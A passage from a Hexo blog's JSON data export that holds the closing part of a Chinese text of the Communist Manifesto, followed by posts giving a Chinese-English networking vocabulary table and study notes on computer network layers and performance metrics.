但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。</p>\n<p>　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。</p>\n<p>　　这种对未来社会的幻想的描绘，是在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，同无产阶级对社会普遍改造的最初的本能的渴望相适应的。</p>\n<p>　　但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。</p>\n<p>　　批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。</p>\n<p>　　因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。</p>\n<p>　　在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。</p>\n<h1 id=\"四、共产党人对各种反对党派的态度\"><a href=\"#四、共产党人对各种反对党派的态度\" class=\"headerlink\" title=\"四、共产党人对各种反对党派的态度\"></a>四、共产党人对各种反对党派的态度</h1><p>　　看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。</p>\n<p>　　共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。</p>\n<p>　　在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。</p>\n<p>　　在波兰人中间，共产党人支持那个把土地革命当做民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。</p>\n<p>　　在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。</p>\n<p>　　但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。</p>\n<p>　　共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。</p>\n<p>　　总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。</p>\n<p>　　在所有这些运动中，他们都特别强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。</p>\n<p>　　最后，共产党人到处都努力争取全世界的民主政党之间的团结和协调。</p>\n<p>　　共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。</p>\n<h1 id=\"全世界无产者们，联合起来！\"><a href=\"#全世界无产者们，联合起来！\" class=\"headerlink\" title=\"全世界无产者们，联合起来！\"></a>全世界无产者们，联合起来！</h1>"},{"title":"程序员需要掌握的英文单词","date":"2020-08-14T03:41:32.000Z","_content":"\n# 涉及到的英文单词\n\n|中文|英文|\n|---|---|\n互联网/互连网|internet|\n|因特网| Internet|\n|连通性| connectivity|\n|网络| network| \n| 结点| Node|\n|链路| link| \n|网络的网络|network of networks|  \n|因特网服务提供者/ISP| Internet Service Provider |\n|网络接入点/NAP|Network Access Point| \n|NAP/对等点|peering point|\n|万维网 WWW|World Wide Web|\n|因特网协会/ISOC/W-ISOC|Internet Society|\n|因特网体系结构委员会 IAB|Internet Architecture Board|\n|因特网工程部 IETF|Internet Engineering Task Force|\n|因特网工程指导小组/IESG|Internet Engineering Steering Group|\n|工作组/WG|Working Group|\n|论坛|forum|\n|因特网研究部/IRTF|Internet Research Task Force|inter\n|研究组/RG|research group|\n|因特网研究指导小组 IRSG|Internet Reseach Steering Group|\n|因特网标准/请求评论/RFC|Request For Comments|\n|因特网草案|Internet Draft|\n|建议标准|Proposed Standard|\n|草案标准|Draft Standard|\n|因特网标准|Internet Standard|\n|端系统/末端系统|end system|\n|客户端|client|\n|服务器|server|\n|用户|user|\n|对等连接/P2P|peer-to-peer|\n|路由器|router|\n|分组交换|packet switching|\n|交换|switching|\n|报文|message|\n|header|首部|\n|分组|packet|\n|报文交换|message switching|\n|广域网 WAN|Wide Area Network|\n|远程网 WAN|long haul network|\n|城域网 MAN|Metropolitan Area Network|\n|局域网 LAN|Local Area Network|\n|个人区域网 PAN|pERSONAL aREA nETWORK|\n|无限个人区域网 WPAN|Wireless PAN|\n|公用网/公众网|public network|\n|专用网|private network|\n|比特/0或者1|bit/binary digit|\n|数据率|data rate|\n|比特率|bit rate|\n|网络协议|network protocol|\n|激活|activate|\n|系统网络体系结构/SNA|system network architecture|\n|开放系统互连基本参考模型 OSI/RM|open systems interconnection reference model|\n|体系结构|architecture|\n|实现|implementation|\n|应用层|application layer|\n|运输层|transport layer|\n|传输控制协议TCP|transmission control protocol|\n|用户数据报协议 UDP|User Datagram Protocol|\n|网络层|network layer|\n|异构|heterogeneous|\n|网际协议IP|Internet protocol|\n|数据链路层|data link layer|\n|帧|frame|\n|物理层|physical layer|\n|TCP/IP 协议簇|protocol suite|\n|协议数据单元 PDU|protocol Data Unit|\n|对等层|peer layers|\n|协议栈|protocol stack|\n|实体|entity|\n|服务访问点SAP|service access point|\n|服务数据单元 SDU|service data unit|\n|源点|source|\n|终点|destination|\n|信号|signal|\n|调制|modulation|\n|载波|carrier|","source":"_posts/EnglistWord/Network.md","raw":"---\ntitle: 程序员需要掌握的英文单词\ndate: 2020-08-14 11:41:32\ncategories:\n- Net\ntags:\n-  Net English Word\n---\n\n# 涉及到的英文单词\n\n|中文|英文|\n|---|---|\n互联网/互连网|internet|\n|因特网| Internet|\n|连通性| connectivity|\n|网络| network| \n| 结点| Node|\n|链路| link| \n|网络的网络|network of networks|  \n|因特网服务提供者/ISP| Internet Service Provider |\n|网络接入点/NAP|Network Access Point| \n|NAP/对等点|peering point|\n|万维网 WWW|World Wide Web|\n|因特网协会/ISOC/W-ISOC|Internet Society|\n|因特网体系结构委员会 IAB|Internet Architecture Board|\n|因特网工程部 IETF|Internet Engineering Task Force|\n|因特网工程指导小组/IESG|Internet Engineering Steering Group|\n|工作组/WG|Working Group|\n|论坛|forum|\n|因特网研究部/IRTF|Internet Research Task Force|inter\n|研究组/RG|research group|\n|因特网研究指导小组 IRSG|Internet Reseach Steering Group|\n|因特网标准/请求评论/RFC|Request For Comments|\n|因特网草案|Internet Draft|\n|建议标准|Proposed Standard|\n|草案标准|Draft Standard|\n|因特网标准|Internet Standard|\n|端系统/末端系统|end system|\n|客户端|client|\n|服务器|server|\n|用户|user|\n|对等连接/P2P|peer-to-peer|\n|路由器|router|\n|分组交换|packet switching|\n|交换|switching|\n|报文|message|\n|header|首部|\n|分组|packet|\n|报文交换|message switching|\n|广域网 WAN|Wide Area Network|\n|远程网 WAN|long haul network|\n|城域网 MAN|Metropolitan Area Network|\n|局域网 LAN|Local Area Network|\n|个人区域网 PAN|pERSONAL aREA nETWORK|\n|无限个人区域网 WPAN|Wireless PAN|\n|公用网/公众网|public network|\n|专用网|private network|\n|比特/0或者1|bit/binary digit|\n|数据率|data rate|\n|比特率|bit rate|\n|网络协议|network protocol|\n|激活|activate|\n|系统网络体系结构/SNA|system network architecture|\n|开放系统互连基本参考模型 OSI/RM|open systems interconnection reference model|\n|体系结构|architecture|\n|实现|implementation|\n|应用层|application layer|\n|运输层|transport layer|\n|传输控制协议TCP|transmission control protocol|\n|用户数据报协议 UDP|User Datagram Protocol|\n|网络层|network layer|\n|异构|heterogeneous|\n|网际协议IP|Internet protocol|\n|数据链路层|data link layer|\n|帧|frame|\n|物理层|physical layer|\n|TCP/IP 协议簇|protocol suite|\n|协议数据单元 PDU|protocol Data Unit|\n|对等层|peer layers|\n|协议栈|protocol stack|\n|实体|entity|\n|服务访问点SAP|service access point|\n|服务数据单元 SDU|service data unit|\n|源点|source|\n|终点|destination|\n|信号|signal|\n|调制|modulation|\n|载波|carrier|","slug":"EnglistWord/Network","published":1,"updated":"2020-08-17T03:33:04.316Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cxy000m2gk79q33b0tl","content":"<h1 id=\"涉及到的英文单词\"><a href=\"#涉及到的英文单词\" class=\"headerlink\" title=\"涉及到的英文单词\"></a>涉及到的英文单词</h1><table>\n<thead>\n<tr>\n<th>中文</th>\n<th>英文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>互联网/互连网</td>\n<td>internet</td>\n</tr>\n<tr>\n<td>因特网</td>\n<td>Internet</td>\n</tr>\n<tr>\n<td>连通性</td>\n<td>connectivity</td>\n</tr>\n<tr>\n<td>网络</td>\n<td>network</td>\n</tr>\n<tr>\n<td>结点</td>\n<td>Node</td>\n</tr>\n<tr>\n<td>链路</td>\n<td>link</td>\n</tr>\n<tr>\n<td>网络的网络</td>\n<td>network of networks</td>\n</tr>\n<tr>\n<td>因特网服务提供者/ISP</td>\n<td>Internet Service Provider</td>\n</tr>\n<tr>\n<td>网络接入点/NAP</td>\n<td>Network Access Point</td>\n</tr>\n<tr>\n<td>NAP/对等点</td>\n<td>peering point</td>\n</tr>\n<tr>\n<td>万维网 WWW</td>\n<td>World Wide Web</td>\n</tr>\n<tr>\n<td>因特网协会/ISOC/W-ISOC</td>\n<td>Internet Society</td>\n</tr>\n<tr>\n<td>因特网体系结构委员会 IAB</td>\n<td>Internet Architecture Board</td>\n</tr>\n<tr>\n<td>因特网工程部 IETF</td>\n<td>Internet Engineering Task Force</td>\n</tr>\n<tr>\n<td>因特网工程指导小组/IESG</td>\n<td>Internet Engineering Steering Group</td>\n</tr>\n<tr>\n<td>工作组/WG</td>\n<td>Working Group</td>\n</tr>\n<tr>\n<td>论坛</td>\n<td>forum</td>\n</tr>\n<tr>\n<td>因特网研究部/IRTF</td>\n<td>Internet Research Task Force</td>\n</tr>\n<tr>\n<td>研究组/RG</td>\n<td>research group</td>\n</tr>\n<tr>\n<td>因特网研究指导小组 IRSG</td>\n<td>Internet Reseach Steering Group</td>\n</tr>\n<tr>\n<td>因特网标准/请求评论/RFC</td>\n<td>Request For Comments</td>\n</tr>\n<tr>\n<td>因特网草案</td>\n<td>Internet Draft</td>\n</tr>\n<tr>\n<td>建议标准</td>\n<td>Proposed Standard</td>\n</tr>\n<tr>\n<td>草案标准</td>\n<td>Draft Standard</td>\n</tr>\n<tr>\n<td>因特网标准</td>\n<td>Internet Standard</td>\n</tr>\n<tr>\n<td>端系统/末端系统</td>\n<td>end system</td>\n</tr>\n<tr>\n<td>客户端</td>\n<td>client</td>\n</tr>\n<tr>\n<td>服务器</td>\n<td>server</td>\n</tr>\n<tr>\n<td>用户</td>\n<td>user</td>\n</tr>\n<tr>\n<td>对等连接/P2P</td>\n<td>peer-to-peer</td>\n</tr>\n<tr>\n<td>路由器</td>\n<td>router</td>\n</tr>\n<tr>\n<td>分组交换</td>\n<td>packet switching</td>\n</tr>\n<tr>\n<td>交换</td>\n<td>switching</td>\n</tr>\n<tr>\n<td>报文</td>\n<td>message</td>\n</tr>\n<tr>\n<td>header</td>\n<td>首部</td>\n</tr>\n<tr>\n<td>分组</td>\n<td>packet</td>\n</tr>\n<tr>\n<td>报文交换</td>\n<td>message switching</td>\n</tr>\n<tr>\n<td>广域网 WAN</td>\n<td>Wide Area Network</td>\n</tr>\n<tr>\n<td>远程网 WAN</td>\n<td>long haul network</td>\n</tr>\n<tr>\n<td>城域网 MAN</td>\n<td>Metropolitan Area Network</td>\n</tr>\n<tr>\n<td>局域网 LAN</td>\n<td>Local Area Network</td>\n</tr>\n<tr>\n<td>个人区域网 PAN</td>\n<td>pERSONAL aREA nETWORK</td>\n</tr>\n<tr>\n<td>无限个人区域网 WPAN</td>\n<td>Wireless PAN</td>\n</tr>\n<tr>\n<td>公用网/公众网</td>\n<td>public network</td>\n</tr>\n<tr>\n<td>专用网</td>\n<td>private network</td>\n</tr>\n<tr>\n<td>比特/0或者1</td>\n<td>bit/binary digit</td>\n</tr>\n<tr>\n<td>数据率</td>\n<td>data rate</td>\n</tr>\n<tr>\n<td>比特率</td>\n<td>bit rate</td>\n</tr>\n<tr>\n<td>网络协议</td>\n<td>network protocol</td>\n</tr>\n<tr>\n<td>激活</td>\n<td>activate</td>\n</tr>\n<tr>\n<td>系统网络体系结构/SNA</td>\n<td>system network architecture</td>\n</tr>\n<tr>\n<td>开放系统互连基本参考模型 OSI/RM</td>\n<td>open systems interconnection reference model</td>\n</tr>\n<tr>\n<td>体系结构</td>\n<td>architecture</td>\n</tr>\n<tr>\n<td>实现</td>\n<td>implementation</td>\n</tr>\n<tr>\n<td>应用层</td>\n<td>application layer</td>\n</tr>\n<tr>\n<td>运输层</td>\n<td>transport layer</td>\n</tr>\n<tr>\n<td>传输控制协议TCP</td>\n<td>transmission control protocol</td>\n</tr>\n<tr>\n<td>用户数据报协议 UDP</td>\n<td>User Datagram Protocol</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>network layer</td>\n</tr>\n<tr>\n<td>异构</td>\n<td>heterogeneous</td>\n</tr>\n<tr>\n<td>网际协议IP</td>\n<td>Internet protocol</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>data link layer</td>\n</tr>\n<tr>\n<td>帧</td>\n<td>frame</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>physical layer</td>\n</tr>\n<tr>\n<td>TCP/IP 协议簇</td>\n<td>protocol suite</td>\n</tr>\n<tr>\n<td>协议数据单元 PDU</td>\n<td>protocol Data Unit</td>\n</tr>\n<tr>\n<td>对等层</td>\n<td>peer layers</td>\n</tr>\n<tr>\n<td>协议栈</td>\n<td>protocol stack</td>\n</tr>\n<tr>\n<td>实体</td>\n<td>entity</td>\n</tr>\n<tr>\n<td>服务访问点SAP</td>\n<td>service access point</td>\n</tr>\n<tr>\n<td>服务数据单元 SDU</td>\n<td>service data unit</td>\n</tr>\n<tr>\n<td>源点</td>\n<td>source</td>\n</tr>\n<tr>\n<td>终点</td>\n<td>destination</td>\n</tr>\n<tr>\n<td>信号</td>\n<td>signal</td>\n</tr>\n<tr>\n<td>调制</td>\n<td>modulation</td>\n</tr>\n<tr>\n<td>载波</td>\n<td>carrier</td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"涉及到的英文单词\"><a href=\"#涉及到的英文单词\" class=\"headerlink\" title=\"涉及到的英文单词\"></a>涉及到的英文单词</h1><table>\n<thead>\n<tr>\n<th>中文</th>\n<th>英文</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>互联网/互连网</td>\n<td>internet</td>\n</tr>\n<tr>\n<td>因特网</td>\n<td>Internet</td>\n</tr>\n<tr>\n<td>连通性</td>\n<td>connectivity</td>\n</tr>\n<tr>\n<td>网络</td>\n<td>network</td>\n</tr>\n<tr>\n<td>结点</td>\n<td>Node</td>\n</tr>\n<tr>\n<td>链路</td>\n<td>link</td>\n</tr>\n<tr>\n<td>网络的网络</td>\n<td>network of networks</td>\n</tr>\n<tr>\n<td>因特网服务提供者/ISP</td>\n<td>Internet Service Provider</td>\n</tr>\n<tr>\n<td>网络接入点/NAP</td>\n<td>Network Access Point</td>\n</tr>\n<tr>\n<td>NAP/对等点</td>\n<td>peering point</td>\n</tr>\n<tr>\n<td>万维网 WWW</td>\n<td>World Wide Web</td>\n</tr>\n<tr>\n<td>因特网协会/ISOC/W-ISOC</td>\n<td>Internet Society</td>\n</tr>\n<tr>\n<td>因特网体系结构委员会 IAB</td>\n<td>Internet Architecture Board</td>\n</tr>\n<tr>\n<td>因特网工程部 IETF</td>\n<td>Internet Engineering Task Force</td>\n</tr>\n<tr>\n<td>因特网工程指导小组/IESG</td>\n<td>Internet Engineering Steering Group</td>\n</tr>\n<tr>\n<td>工作组/WG</td>\n<td>Working Group</td>\n</tr>\n<tr>\n<td>论坛</td>\n<td>forum</td>\n</tr>\n<tr>\n<td>因特网研究部/IRTF</td>\n<td>Internet Research Task Force</td>\n</tr>\n<tr>\n<td>研究组/RG</td>\n<td>research group</td>\n</tr>\n<tr>\n<td>因特网研究指导小组 IRSG</td>\n<td>Internet Reseach Steering Group</td>\n</tr>\n<tr>\n<td>因特网标准/请求评论/RFC</td>\n<td>Request For Comments</td>\n</tr>\n<tr>\n<td>因特网草案</td>\n<td>Internet Draft</td>\n</tr>\n<tr>\n<td>建议标准</td>\n<td>Proposed Standard</td>\n</tr>\n<tr>\n<td>草案标准</td>\n<td>Draft Standard</td>\n</tr>\n<tr>\n<td>因特网标准</td>\n<td>Internet Standard</td>\n</tr>\n<tr>\n<td>端系统/末端系统</td>\n<td>end system</td>\n</tr>\n<tr>\n<td>客户端</td>\n<td>client</td>\n</tr>\n<tr>\n<td>服务器</td>\n<td>server</td>\n</tr>\n<tr>\n<td>用户</td>\n<td>user</td>\n</tr>\n<tr>\n<td>对等连接/P2P</td>\n<td>peer-to-peer</td>\n</tr>\n<tr>\n<td>路由器</td>\n<td>router</td>\n</tr>\n<tr>\n<td>分组交换</td>\n<td>packet switching</td>\n</tr>\n<tr>\n<td>交换</td>\n<td>switching</td>\n</tr>\n<tr>\n<td>报文</td>\n<td>message</td>\n</tr>\n<tr>\n<td>header</td>\n<td>首部</td>\n</tr>\n<tr>\n<td>分组</td>\n<td>packet</td>\n</tr>\n<tr>\n<td>报文交换</td>\n<td>message switching</td>\n</tr>\n<tr>\n<td>广域网 WAN</td>\n<td>Wide Area Network</td>\n</tr>\n<tr>\n<td>远程网 WAN</td>\n<td>long haul network</td>\n</tr>\n<tr>\n<td>城域网 MAN</td>\n<td>Metropolitan Area Network</td>\n</tr>\n<tr>\n<td>局域网 LAN</td>\n<td>Local Area Network</td>\n</tr>\n<tr>\n<td>个人区域网 PAN</td>\n<td>pERSONAL aREA nETWORK</td>\n</tr>\n<tr>\n<td>无限个人区域网 WPAN</td>\n<td>Wireless PAN</td>\n</tr>\n<tr>\n<td>公用网/公众网</td>\n<td>public network</td>\n</tr>\n<tr>\n<td>专用网</td>\n<td>private network</td>\n</tr>\n<tr>\n<td>比特/0或者1</td>\n<td>bit/binary digit</td>\n</tr>\n<tr>\n<td>数据率</td>\n<td>data rate</td>\n</tr>\n<tr>\n<td>比特率</td>\n<td>bit rate</td>\n</tr>\n<tr>\n<td>网络协议</td>\n<td>network protocol</td>\n</tr>\n<tr>\n<td>激活</td>\n<td>activate</td>\n</tr>\n<tr>\n<td>系统网络体系结构/SNA</td>\n<td>system network architecture</td>\n</tr>\n<tr>\n<td>开放系统互连基本参考模型 OSI/RM</td>\n<td>open systems interconnection reference model</td>\n</tr>\n<tr>\n<td>体系结构</td>\n<td>architecture</td>\n</tr>\n<tr>\n<td>实现</td>\n<td>implementation</td>\n</tr>\n<tr>\n<td>应用层</td>\n<td>application layer</td>\n</tr>\n<tr>\n<td>运输层</td>\n<td>transport layer</td>\n</tr>\n<tr>\n<td>传输控制协议TCP</td>\n<td>transmission control protocol</td>\n</tr>\n<tr>\n<td>用户数据报协议 UDP</td>\n<td>User Datagram Protocol</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>network layer</td>\n</tr>\n<tr>\n<td>异构</td>\n<td>heterogeneous</td>\n</tr>\n<tr>\n<td>网际协议IP</td>\n<td>Internet protocol</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>data link layer</td>\n</tr>\n<tr>\n<td>帧</td>\n<td>frame</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>physical layer</td>\n</tr>\n<tr>\n<td>TCP/IP 协议簇</td>\n<td>protocol suite</td>\n</tr>\n<tr>\n<td>协议数据单元 PDU</td>\n<td>protocol Data Unit</td>\n</tr>\n<tr>\n<td>对等层</td>\n<td>peer layers</td>\n</tr>\n<tr>\n<td>协议栈</td>\n<td>protocol stack</td>\n</tr>\n<tr>\n<td>实体</td>\n<td>entity</td>\n</tr>\n<tr>\n<td>服务访问点SAP</td>\n<td>service access point</td>\n</tr>\n<tr>\n<td>服务数据单元 SDU</td>\n<td>service data unit</td>\n</tr>\n<tr>\n<td>源点</td>\n<td>source</td>\n</tr>\n<tr>\n<td>终点</td>\n<td>destination</td>\n</tr>\n<tr>\n<td>信号</td>\n<td>signal</td>\n</tr>\n<tr>\n<td>调制</td>\n<td>modulation</td>\n</tr>\n<tr>\n<td>载波</td>\n<td>carrier</td>\n</tr>\n</tbody></table>\n"},{"title":"网络部分","date":"2020-05-08T03:41:32.000Z","_content":"\n# 详解C#的网络\n\n为了对计算机网络有初步的了解,需要先阅读 <<计算机网络.第五版.谢希任.pdf>>\n以及一些其他的网络书籍\n# Socket\n","source":"_posts/Net/CSharp.md","raw":"---\ntitle:  网络部分\ndate: 2020-05-08 11:41:32\ncategories:\n- Net\ntags:\n- CSharp\n---\n\n# 详解C#的网络\n\n为了对计算机网络有初步的了解,需要先阅读 <<计算机网络.第五版.谢希任.pdf>>\n以及一些其他的网络书籍\n# Socket\n","slug":"Net/CSharp","published":1,"updated":"2020-08-14T02:30:38.676Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cxz000n2gk74jzi3act","content":"<h1 id=\"详解C-的网络\"><a href=\"#详解C-的网络\" class=\"headerlink\" title=\"详解C#的网络\"></a>详解C#的网络</h1><p>为了对计算机网络有初步的了解,需要先阅读 &lt;&lt;计算机网络.第五版.谢希任.pdf&gt;&gt;<br>以及一些其他的网络书籍</p>\n<h1 id=\"Socket\"><a href=\"#Socket\" class=\"headerlink\" title=\"Socket\"></a>Socket</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"详解C-的网络\"><a href=\"#详解C-的网络\" class=\"headerlink\" title=\"详解C#的网络\"></a>详解C#的网络</h1><p>为了对计算机网络有初步的了解,需要先阅读 &lt;&lt;计算机网络.第五版.谢希任.pdf&gt;&gt;<br>以及一些其他的网络书籍</p>\n<h1 id=\"Socket\"><a href=\"#Socket\" class=\"headerlink\" title=\"Socket\"></a>Socket</h1>"},{"title":"网络部分","date":"2020-05-08T03:41:32.000Z","_content":"\n# 计算机网络.第五版.谢希任\n\n* 1. 概述:因特网,管理协会,路由器,分组交换,计算机网络的类别,性能,体系结构\n* 2. 物理层\n* 3. 数据链路层\n* 4. 网络层\n* 5. 运输层/传输层\n* 6. 应用层\n* 7. 网络安全\n* 8. 音/视频服务\n* 9. 无线网络\n* 10. 下一代因特网,IPV6,MPLS, P2P 文件共享的基本工作原理\n\n\n## 第一章概述详解\n* 1. \"三网\":电信网络,有线电视网络,计算机网络(因特网)\n* 2. 网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成.\n* 3. 路由器是实现分组交换的关键构件,其任务是转发收到的分组,这是网络核心部分最重要的功能.\n* 4. 电路交换:建立连接(占用通信资源)--->通话(一直占用通信资源)--->释放连接(归还通信资源);\n* 5. 分组交换采用存储转发技术:把要发送的整块数据成为一个报文,将长报文划分成为一个个更小的等长数据段,每个数据段为 1024 bit( 等于 128Byte ),每个数据段前面加一些控制信息组成的首部(包头,存储了目标地址与源地址),就构成了一个分组(包).\n* 6. 主机是为用户进行信息处理的,路由器则是用来转发分组的,进行分组交换的.路由器转发分组的过程就是因特网的核心,单个的网络简化成一条链路,路由器是核心结点\n* 7. 电路交换-->整个报文的比特流连续的从源点直达终点,好像在一个管道中传送.报文交换-->整个报文先传送到相邻结点,全部存储下来后查找转发表,转发到下一个结点.分组交换-->单个分组(这只是整个报文的一部分,最大 128Byte)传送到相邻结点,存储下来后查找转发表,转发到下一个结点.\n* 8. 广域网/远程网,几十到几千公里,因特网的核心部分;城域网,一个城市5-50km,采用以太网技术;局域网,微型计算机或工作站通过高速通信线路相连(速率通常在 10Mb/s 以上),1KM 左右,校园网/企业网;个人区域网/无限个人区域网 WPAN ,10m 左右,多处理机系统/集群;公用网/公众网,电信公司出资建造的大型网络;专用网,某个部分为本单位的特殊业务工作的需要而建造的网络;接入网,用来把用户接入因特网的网络,又称为本地接入网或居民接入网.\n* 9. 计算机网络的性能指标:\n    > 1 速度 b/s(比特每秒 bit/s),bps(bit per second);      \n    > 2 带宽,本来是指某个信号具有的频带宽度,信号的带宽是指该信号所包含的各种不同频率成份所占据的频率范围.电话信号的标准带宽是 3.1 kHz ,单位是赫;在计算机网络中带宽用来表示网络的通信线路所能传送数据的能力,因为网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的\"最高数据率\",通常意义上面我们都表示这个意思,单位是比特每秒,b/s;       \n    > 3 吞吐量,表示在单位时间内通过某个网络的数据量;       \n    > 4 时延是指数据(报文或者分组,比特)从网络(链路)的一端传到另一端所需要的时间,发送时延/传输时延是主机或路由器发送数据帧所需要的时间,也就是从发送数据帧的第一个比特算起到该帧的最后一个比特发送完毕所需要的时间,传播时延是电磁波在信道中传播一定的距离需要花费的时间,处理时延是指主机或者路由器在收到分组时要花费一定的时间进行处理,分析分组的头部,从分组中提取数据部分,进行插座检验或者查找适当的路由,排队时延是指在分组经过网络传输时,经过很多路由器,进入路由器后要先输入队列中排队等待处理;        \n    > 5 传播时延X带宽=传播时延带宽积/以比特为单位的链路长度,某段链路最大能承载多少个比特;      \n    > 6 往返时间 RTT,一来一回的时间;       \n    > 7 利用率有信道利用率与网络利用率 2 种,信道或者网络利用率过高会产生非常大的时延.      \n\n* 10. 计算机网络体系结构的形成\n>分层:      \n>> 1: 各层之间是独立的      \n>> 2: 灵活性好      \n>> 3: 结构上可分割开        \n>> 4: 易于实现和维护        \n>> 5: 能促进标准化工作;差错控制,流量控制,分段和重装,复用和分用,连接建立和释放;            \n\n> 体系结构      \n\n|OSI 的体系结构|TCP/IP 的体系结构|五层协议的体系结构|\n|---|---|---|\n应用层      |应用层(各种应用层协议,TELNET,FTP,SMTP,HTTP)|应用层|\n表示层      |                  同上                  |同上|\n会话层      |                  同上                  |同上|\n运输层      |运输层(TCP/UDP)                         |运输层|\n网络层      |网际层 IP                               |网络层|\n数据链路层   |网络接口层                              |数据链路层|\n物理层      |同上                                    |物理层|\n\n>> **应用层** 直接为用户的应用进程提供服务,进程是指正在运行的程序;HTTP,SMTP,FTP都是应用层协议       \n>> **运输层** 负责向 2 个主机中进程之间的通信提供服务,因为一个主机可以同时运行多个进程,所以运输层有复用和分用的功能;复用就是多个应用层进程可同时使用下面运输层的服务,分用则是运输层把收到的信息分别交付给上面应用层中的相应的进程;      \nTCP-->面向连接的,数据传输的单位是报文段,能够提供可靠的交付;     \nUDP-->无连接的,数据传输的单位是用户数据报,不保证提供可靠的交付,只能提供\"尽最大努力交付\"             \n>>   **网络层**  为分组交换网上的不同主机提供通信服务;发送数据时,网络层把运输层产生的报文段或用户数据报分装成分组或包进行传送;这个地方的网络是由大量的异构网络通过路由器相互连接起来.因特网的主要网络层协议是无连接的网际协议 IP 和许多种路由选择协议,也被称为网际层/IP 层;         \n>> **数据链路层** 两个主机之间的数据传输,总是在一段一段的链路上传送的,在两个相邻结点之间(主机和路由器之间或 2 个路由器之间)传送数据是直接传送的(点对点);这时需要专门的链路层协议,将网络层交付下来的 IP 数据报组装成帧,透明的传送帧数据,每一帧包括数据和必要的控制信息(同步信息,地址信息,差错控制)            \n>> **物理层** 透明的传送比特流;使用多大电压表示 1 或 0; 确定连接电缆的插头有多少根引脚以及如何连接;物理层不包含实物,比如双绞线,同轴电缆,光缆,无线信道,这些叫做物理媒体\n\n## 第二章物理层详解\n* 1. 物理层尽可能的将各种实体(各种实体线,铜线,光缆等)之间的差异进行兼容,从而避免影响数据链路层;\n* 2. 主要作用是规定接线器的形状,尺寸,引脚数目,排列,固定和锁定装置,标准化此类东西;确定线上的电压范围,确定电压表示的意义,确定各种可能事件的出现顺序.主要过程是由源点-->发送器-->传输系统-->接收器-->终点.\n\n\n\n# 计算机网络_第5版_中文版_严伟_潘爱民译_清华大学\n\n* 1. \n\n\n\n\n\n\n","source":"_posts/Net/net.md","raw":"---\ntitle:  网络部分\ndate: 2020-05-08 11:41:32\ncategories:\n- Net\ntags:\n- Net\n---\n\n# 计算机网络.第五版.谢希任\n\n* 1. 概述:因特网,管理协会,路由器,分组交换,计算机网络的类别,性能,体系结构\n* 2. 物理层\n* 3. 数据链路层\n* 4. 网络层\n* 5. 运输层/传输层\n* 6. 应用层\n* 7. 网络安全\n* 